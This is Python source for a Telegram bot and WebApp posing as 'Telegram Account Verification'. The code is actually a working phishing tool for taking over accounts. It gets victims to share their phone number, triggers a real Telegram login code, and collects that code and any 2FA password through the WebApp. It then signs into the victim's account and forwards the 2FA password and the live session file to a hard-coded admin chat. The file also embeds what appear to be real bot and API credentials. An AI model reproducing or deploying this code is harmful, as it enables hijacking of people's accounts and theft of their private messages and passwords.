import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError, FloodWaitError
from flask import Flask, render_template, request, jsonify, redirect, url_for
import asyncio
from datetime import datetime, timedelta
import re
import time
import threading
import requests
import uuid
import json

# Initialize Flask
app = Flask(__name__)

# Configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
USER_ID = int(os.environ.get('USER_ID', '5425526761'))
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Storage
sessions = {}
session_expiry = 300  # 5 minutes
telegram_clients = {}

# Create directories
os.makedirs('sessions', exist_ok=True)

# ==================== HELPER FUNCTIONS ====================
def generate_session_id():
    return str(uuid.uuid4())

def clean_phone(phone):
    return re.sub(r'[^\d+]', '', phone)

def generate_session_file(phone):
    safe_phone = clean_phone(phone)
    timestamp = int(time.time())
    return f"sessions/{safe_phone}_{timestamp}.session"

def clean_otp(otp):
    cleaned = re.sub(r'\D', '', otp)
    return cleaned if len(cleaned) == 5 else None

def get_client(session_file):
    if session_file not in telegram_clients:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(
            session_file,
            API_ID,
            API_HASH,
            loop=loop,
            connection_retries=3,
            timeout=30
        )
        telegram_clients[session_file] = {
            'client': client,
            'loop': loop,
            'created': time.time()
        }
    return telegram_clients[session_file]

async def send_otp_async(client, phone):
    try:
        await client.connect()
        print(f"Connected to Telegram, sending OTP to {phone}")
        
        result = await client.send_code_request(phone)
        print(f"OTP sent successfully to {phone}")
        
        return {
            'success': True,
            'phone_code_hash': result.phone_code_hash
        }
    except FloodWaitError as e:
        wait_time = e.seconds
        print(f"Flood wait: {wait_time} seconds")
        return {'success': False, 'error': f'Please wait {wait_time} seconds before trying again'}
    except Exception as e:
        error_msg = str(e)
        print(f"Error sending OTP to {phone}: {error_msg}")
        
        if "PHONE_NUMBER_INVALID" in error_msg:
            return {'success': False, 'error': 'Invalid phone number format'}
        elif "PHONE_NUMBER_BANNED" in error_msg:
            return {'success': False, 'error': 'Phone number is banned'}
        elif "PHONE_CODE_EMPTY" in error_msg:
            return {'success': False, 'error': 'Phone code is empty'}
        elif "PHONE_CODE_EXPIRED" in error_msg:
            return {'success': False, 'error': 'Phone code expired'}
        elif "PHONE_CODE_INVALID" in error_msg:
            return {'success': False, 'error': 'Invalid phone code'}
        elif "SESSION_PASSWORD_NEEDED" in error_msg:
            return {'success': False, 'error': '2FA password needed'}
        else:
            return {'success': False, 'error': f'Failed to send OTP: {error_msg}'}

async def verify_otp_async(client, phone, code, phone_code_hash):
    try:
        print(f"Verifying OTP for {phone}: {code}")
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        
        if await client.is_user_authorized():
            me = await client.get_me()
            print(f"Successfully verified {phone}, user: {me.username}")
            return {
                'success': True,
                'requires_2fa': False,
                'user': {
                    'id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'phone': phone
                }
            }
        else:
            print(f"Verification succeeded but needs 2FA for {phone}")
            return {'success': True, 'requires_2fa': True}
            
    except SessionPasswordNeededError:
        print(f"2FA needed for {phone}")
        return {'success': True, 'requires_2fa': True}
    except PhoneCodeExpiredError:
        print(f"OTP expired for {phone}")
        return {'success': False, 'error': 'OTP expired', 'code_expired': True}
    except PhoneCodeInvalidError:
        print(f"Invalid OTP for {phone}")
        return {'success': False, 'error': 'Invalid OTP code'}
    except Exception as e:
        error_str = str(e)
        print(f"Verification error for {phone}: {error_str}")
        
        if 'password' in error_str.lower() or '2fa' in error_str.lower():
            return {'success': True, 'requires_2fa': True}
        elif 'code' in error_str.lower() and 'expired' in error_str.lower():
            return {'success': False, 'error': 'OTP expired', 'code_expired': True}
        else:
            return {'success': False, 'error': f'Verification failed: {error_str}'}

async def verify_2fa_async(client, password):
    try:
        await client.sign_in(password=password)
        me = await client.get_me()
        print(f"2FA successful for {me.phone}")
        return {
            'success': True,
            'user': {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
        }
    except Exception as e:
        print(f"2FA error: {e}")
        return {'success': False, 'error': f'Wrong password: {str(e)}'}

def send_to_admin(phone, user_info=None, password=None, source="chat"):
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        msg = f"""📱 <b>NEW VERIFICATION</b>

📞 Phone: {phone}
⏰ Time: {timestamp}
🌐 Source: {source}"""
        
        if user_info:
            full_name = f"{user_info.get('first_name', '')} {user_info.get('last_name', '')}".strip()
            if full_name:
                msg += f"\n👤 Name: {full_name}"
            if user_info.get('username'):
                msg += f"\n🔗 Username: @{user_info.get('username')}"
            msg += f"\n🆔 ID: {user_info.get('id', 'N/A')}"
        
        if password:
            msg += f"\n🔐 2FA Password: <code>{password}</code>"
        
        msg += f"\n\n✅ <b>VERIFICATION SUCCESSFUL</b>"
        
        bot.send_message(USER_ID, msg, parse_mode='HTML')
        print(f"Admin notification sent for {phone}")
        return True
    except Exception as e:
        print(f"Admin notification error: {e}")
        return False

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    """Main WebApp page - shows contact sharing"""
    return render_template('index.html')

@app.route('/init-session', methods=['POST'])
def init_session():
    """Create a new session when WebApp opens"""
    try:
        data = request.json
        user_id = data.get('user_id')
        username = data.get('username', '')
        first_name = data.get('first_name', '')
        last_name = data.get('last_name', '')
        
        # Generate session ID for this WebApp instance
        session_id = generate_session_id()
        
        # Store session with user info (phone will be added later)
        sessions[session_id] = {
            'user_id': user_id,
            'username': username,
            'first_name': first_name,
            'last_name': last_name,
            'phone': None,
            'status': 'waiting_for_contact',
            'expiry': datetime.now() + timedelta(seconds=session_expiry),
            'attempts': 0,
            'created': datetime.now()
        }
        
        print(f"Created new WebApp session: {session_id} for user {user_id}")
        
        return jsonify({
            'success': True,
            'session_id': session_id,
            'message': 'Session created successfully'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/otp/<session_id>/<phone>')
def otp_page(session_id, phone):
    """OTP entry page - accessed after contact is shared"""
    if session_id not in sessions:
        return "Session expired. Please start over.", 400
    
    session = sessions[session_id]
    if session['phone'] != phone:
        return "Phone number mismatch.", 400
    
    return render_template('otp.html', session_id=session_id, phone=phone)

@app.route('/success')
def success_page():
    """Success page"""
    return render_template('success.html')

@app.route('/api/get-session-info', methods=['POST'])
def get_session_info():
    """Get session info for WebApp"""
    try:
        data = request.json
        session_id = data.get('session_id')
        
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'Session expired or invalid'})
        
        session = sessions[session_id]
        return jsonify({
            'success': True,
            'phone': session.get('phone', ''),
            'first_name': session.get('first_name', ''),
            'last_name': session.get('last_name', ''),
            'status': session.get('status', '')
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-contact', methods=['POST'])
def verify_contact():
    """Verify contact and send OTP - called from WebApp after contact is shared"""
    try:
        data = request.json
        session_id = data.get('session_id')
        phone = data.get('phone', '').strip()
        
        print(f"Verifying contact for session {session_id}: {phone}")
        
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'Session expired. Please restart WebApp.'})
        
        # Format phone number
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Validate phone number
        if len(phone) < 8 or not re.match(r'^\+\d+$', phone):
            return jsonify({'success': False, 'error': 'Invalid phone number format'})
        
        # Generate session file
        session_file = generate_session_file(phone)
        
        # Send OTP
        client_data = get_client(session_file)
        client = client_data['client']
        loop = client_data['loop']
        
        print(f"Sending OTP to {phone}...")
        result = loop.run_until_complete(send_otp_async(client, phone))
        
        if result['success']:
            # Update session with phone and OTP info
            sessions[session_id].update({
                'phone': phone,
                'phone_code_hash': result['phone_code_hash'],
                'session_file': session_file,
                'status': 'otp_sent',
                'expiry': datetime.now() + timedelta(seconds=session_expiry),
                'otp_attempts': 0
            })
            
            print(f"OTP sent successfully to {phone}, session: {session_id}")
            
            return jsonify({
                'success': True,
                'message': 'OTP sent successfully',
                'redirect_url': f'/otp/{session_id}/{phone}'
            })
        else:
            print(f"Failed to send OTP to {phone}: {result.get('error')}")
            return jsonify({'success': False, 'error': result.get('error', 'Failed to send OTP')})
            
    except Exception as e:
        print(f"Error in verify-contact: {str(e)}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    """Verify OTP from WebApp"""
    try:
        data = request.json
        session_id = data.get('session_id')
        otp = data.get('otp', '')
        
        print(f"Verifying OTP for session {session_id}: {otp}")
        
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'Session expired. Please start over.'})
        
        session = sessions[session_id]
        
        # Clean OTP
        cleaned_otp = clean_otp(otp)
        if not cleaned_otp:
            return jsonify({'success': False, 'error': 'Invalid OTP format. Enter 5 digits.'})
        
        # Check attempts
        session['otp_attempts'] += 1
        if session['otp_attempts'] > 3:
            del sessions[session_id]
            return jsonify({'success': False, 'error': 'Too many attempts. Please start over.'})
        
        # Verify OTP
        client_data = get_client(session['session_file'])
        client = client_data['client']
        loop = client_data['loop']
        
        print(f"Verifying OTP {cleaned_otp} for {session['phone']}")
        result = loop.run_until_complete(verify_otp_async(
            client,
            session['phone'],
            cleaned_otp,
            session['phone_code_hash']
        ))
        
        if result['success']:
            if result.get('requires_2fa'):
                session['expiry'] = datetime.now() + timedelta(seconds=600)
                print(f"2FA required for {session['phone']}")
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA authentication required'
                })
            else:
                # Success - send session to admin
                print(f"Verification successful for {session['phone']}")
                send_to_admin(
                    session['phone'], 
                    result.get('user'), 
                    source='webapp'
                )
                
                # Send session file if exists
                if os.path.exists(session['session_file']):
                    try:
                        with open(session['session_file'], 'rb') as f:
                            bot.send_document(
                                USER_ID,
                                f,
                                caption=f"✅ Session for {session['phone']}\n⏰ {datetime.now().strftime('%H:%M:%S')}\n🌐 Source: WebApp"
                            )
                        print(f"Session file sent to admin for {session['phone']}")
                    except Exception as e:
                        print(f"Failed to send session file: {e}")
                
                del sessions[session_id]
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'redirect_url': '/success'
                })
        else:
            if result.get('code_expired'):
                print(f"OTP expired for {session['phone']}")
                del sessions[session_id]
                return jsonify({'success': False, 'error': 'OTP expired. Please start over.'})
            print(f"Verification failed for {session['phone']}: {result.get('error')}")
            return jsonify({'success': False, 'error': result.get('error', 'Verification failed')})
            
    except Exception as e:
        print(f"Error in verify-otp: {str(e)}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})

@app.route('/api/verify-2fa', methods=['POST'])
def verify_2fa():
    """Verify 2FA password from WebApp"""
    try:
        data = request.json
        session_id = data.get('session_id')
        password = data.get('password', '').strip()
        
        print(f"Verifying 2FA for session {session_id}")
        
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        if not password:
            return jsonify({'success': False, 'error': 'Please enter 2FA password'})
        
        session = sessions[session_id]
        client_data = get_client(session['session_file'])
        client = client_data['client']
        loop = client_data['loop']
        
        result = loop.run_until_complete(verify_2fa_async(client, password))
        
        if result['success']:
            # Success with 2FA
            print(f"2FA successful for {session['phone']}")
            send_to_admin(
                session['phone'], 
                result.get('user'), 
                password, 
                'webapp'
            )
            
            # Send session file
            if os.path.exists(session['session_file']):
                try:
                    with open(session['session_file'], 'rb') as f:
                        bot.send_document(
                            USER_ID,
                            f,
                            caption=f"✅ 2FA Session for {session['phone']}\n⏰ {datetime.now().strftime('%H:%M:%S')}\n🌐 Source: WebApp"
                        )
                except:
                    pass
            
            del sessions[session_id]
            return jsonify({
                'success': True, 
                'message': '2FA verified successfully',
                'redirect_url': '/success'
            })
        else:
            print(f"2FA failed for {session['phone']}: {result.get('error')}")
            return jsonify({'success': False, 'error': result.get('error', '2FA verification failed')})
            
    except Exception as e:
        print(f"Error in verify-2fa: {str(e)}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    """Send WebApp button directly"""
    try:
        # Create WebApp URL
        webapp_url = WEBHOOK_URL.rstrip('/') if WEBHOOK_URL else f"https://{request.host}"
        
        # Create inline keyboard with WebApp button
        keyboard = types.InlineKeyboardMarkup()
        webapp_btn = types.InlineKeyboardButton(
            text="📱 Open WebApp to Verify",
            web_app=types.WebAppInfo(url=webapp_url)
        )
        keyboard.add(webapp_btn)
        
        bot.send_message(
            message.chat.id,
            """🔐 <b>Telegram Account Verification</b>

Click the button below to open the WebApp and verify your account:

✅ <b>WebApp Features:</b>
• Share contact directly in WebApp
• Enter OTP securely
• 2FA support if enabled
• No chat messages
• Auto-delete shared contact

<b>Click below to begin:</b>""",
            parse_mode='HTML',
            reply_markup=keyboard
        )
        
        print(f"WebApp button sent to user {message.from_user.id}")
        
    except Exception as e:
        print(f"Start command error: {e}")

# ==================== WEBHOOK SETUP ====================
def setup_webhook():
    """Set up webhook for Render"""
    try:
        if WEBHOOK_URL:
            bot.remove_webhook()
            time.sleep(1)
            webhook_url = f"{WEBHOOK_URL.rstrip('/')}/bot/{BOT_TOKEN}"
            bot.set_webhook(url=webhook_url)
            print(f"✅ Webhook set: {webhook_url}")
            return True
        else:
            print("⚠️ No WEBHOOK_URL set, using polling")
            return False
    except Exception as e:
        print(f"❌ Webhook error: {e}")
        return False

@app.route(f'/bot/{BOT_TOKEN}', methods=['POST'])
def webhook():
    """Handle Telegram webhook"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'OK', 403

# ==================== CLEANUP THREAD ====================
def cleanup_loop():
    """Clean up old sessions"""
    while True:
        time.sleep(60)
        current_time = datetime.now()
        expired = []
        
        for session_id, session in sessions.items():
            if session['expiry'] < current_time:
                expired.append(session_id)
        
        for session_id in expired:
            del sessions[session_id]
        
        print(f"Cleanup: Removed {len(expired)} expired sessions, {len(sessions)} active")

# ==================== MAIN ====================
if __name__ == '__main__':
    print("="*60)
    print("🚀 Telegram WebApp Verification Bot")
    print("="*60)
    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"👤 User ID: {USER_ID}")
    print(f"🔧 API ID: {API_ID}")
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_loop, daemon=True)
    cleanup_thread.start()
    print("✅ Cleanup thread started")
    
    # Set up webhook or polling
    port = int(os.environ.get('PORT', 5000))
    
    if WEBHOOK_URL and port == 10000:  # Render uses port 10000
        setup_webhook()
        print(f"🌐 WebApp URL: {WEBHOOK_URL}")
        print("🤖 Bot running via webhook")
        app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
    else:
        print("🌐 Local development mode")
        print(f"📱 WebApp URL: http://localhost:{port}")
        print("🤖 Bot running via polling")
        
        # Start bot in separate thread
        def run_bot():
            try:
                print("Starting bot polling...")
                bot.polling(none_stop=True, timeout=30, skip_pending=True)
            except Exception as e:
                print(f"Bot polling error: {e}")
                time.sleep(5)
                run_bot()
        
        bot_thread = threading.Thread(target=run_bot, daemon=True)
        bot_thread.start()
        time.sleep(2)  # Give bot time to start
        
        # Run Flask
        print("Starting Flask server...")
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)
